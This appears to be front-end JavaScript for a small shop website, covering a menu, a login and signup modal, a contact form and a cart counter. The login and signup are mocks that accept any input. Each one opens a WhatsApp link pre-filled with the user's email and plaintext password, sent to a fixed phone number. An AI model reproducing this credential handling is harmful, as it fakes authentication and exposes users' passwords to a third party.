document.addEventListener('DOMContentLoaded', function() {
    // Hamburger menu toggle
    const hamburger = document.getElementById('hamburger');
    const navMenu = document.getElementById('nav-menu');
    if (hamburger && navMenu) {
        hamburger.addEventListener('click', () => {
            navMenu.classList.toggle('show');
            hamburger.classList.toggle('active');
        });
    }

    // Auth modal handling
    const authBtn = document.getElementById('auth-btn');
    const authText = document.getElementById('auth-text');
    const authModal = document.getElementById('auth-modal');
    const modalClose = document.getElementById('modal-close');
    const loginFormDiv = document.getElementById('login-form');
    const signupFormDiv = document.getElementById('signup-form');
    const showSignup = document.getElementById('show-signup');
    const showLogin = document.getElementById('show-login');
    const userDropdown = document.getElementById('user-dropdown');
    const logoutBtn = document.getElementById('logout-btn');

    // Check if logged in
    if (localStorage.getItem('isLoggedIn') === 'true') {
        authText.textContent = 'Profile';
        userDropdown.style.display = 'block'; // Assuming dropdown is hidden initially
    }

    if (authBtn && authModal) {
        authBtn.addEventListener('click', () => {
            if (localStorage.getItem('isLoggedIn') === 'true') {
                userDropdown.style.display = userDropdown.style.display === 'block' ? 'none' : 'block';
            } else {
                authModal.style.display = 'flex';
                loginFormDiv.style.display = 'block';
                signupFormDiv.style.display = 'none';
            }
        });
    }

    if (modalClose) {
        modalClose.addEventListener('click', () => {
            authModal.style.display = 'none';
        });
    }

    if (showSignup) {
        showSignup.addEventListener('click', (e) => {
            e.preventDefault();
            loginFormDiv.style.display = 'none';
            signupFormDiv.style.display = 'block';
        });
    }

    if (showLogin) {
        showLogin.addEventListener('click', (e) => {
            e.preventDefault();
            signupFormDiv.style.display = 'none';
            loginFormDiv.style.display = 'block';
        });
    }

    // Mock login
    const loginForm = document.getElementById('login-form-element');
    if (loginForm) {
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            // Mock login logic
            localStorage.setItem('isLoggedIn', 'true');
            authText.textContent = 'Profile';
            userDropdown.style.display = 'block';
            authModal.style.display = 'none';
            alert('Logged in successfully!');
            // Optionally send to WhatsApp
            const email = document.getElementById('login-email').value;
            const password = document.getElementById('login-password').value;
            const msg = `Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
            window.open(`https://wa.me/+923074242761?text=${encodeURIComponent(msg)}`, '_blank');
        });
    }

    // Mock signup
    const signupForm = document.getElementById('signup-form-element');
    if (signupForm) {
        signupForm.addEventListener('submit', (e) => {
            e.preventDefault();
            // Mock signup logic
            localStorage.setItem('isLoggedIn', 'true');
            authText.textContent = 'Profile';
            userDropdown.style.display = 'block';
            authModal.style.display = 'none';
            alert('Signed up successfully!');
            // Send to WhatsApp
            const name = document.getElementById('signup-name').value;
            const email = document.getElementById('signup-email').value;
            const phone = document.getElementById('signup-phone').value;
            const password = document.getElementById('signup-password').value;
            const msg = `New Signup:\nName: ${name}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`;
            window.open(`https://wa.me/+923074242761?text=${encodeURIComponent(msg)}`, '_blank');
        });
    }

    // Logout
    if (logoutBtn) {
        logoutBtn.addEventListener('click', (e) => {
            e.preventDefault();
            localStorage.setItem('isLoggedIn', 'false');
            authText.textContent = 'Login';
            userDropdown.style.display = 'none';
            alert('Logged out successfully!');
        });
    }

    // Contact form submission to WhatsApp
    const contactForm = document.getElementById('contact-form');
    if (contactForm) {
        contactForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const name = document.getElementById('contact-name').value;
            const email = document.getElementById('contact-email').value;
            const phone = document.getElementById('contact-phone').value;
            const message = document.getElementById('contact-message').value;
            const whatsappMsg = `Contact Inquiry:\nName: ${name}\nEmail: ${email}\nPhone: ${phone}\nMessage: ${message}`;
            const whatsappUrl = `https://wa.me/+923074242761?text=${encodeURIComponent(whatsappMsg)}`;
            window.open(whatsappUrl, '_blank');
            contactForm.reset();
            alert('Your message has been sent via WhatsApp!');
        });
    }

    // Update cart count
    const cartCount = document.getElementById('cart-count');
    if (cartCount) {
        const cart = JSON.parse(localStorage.getItem('cart')) || [];
        cartCount.textContent = cart.length;
    }

    // Close menus on outside click
    document.addEventListener('click', (e) => {
        if (!authBtn.contains(e.target) && !userDropdown.contains(e.target)) {
            userDropdown.style.display = 'none';
        }
        if (!hamburger.contains(e.target) && !navMenu.contains(e.target)) {
            navMenu.classList.remove('show');
            hamburger.classList.remove('active');
        }
    });
});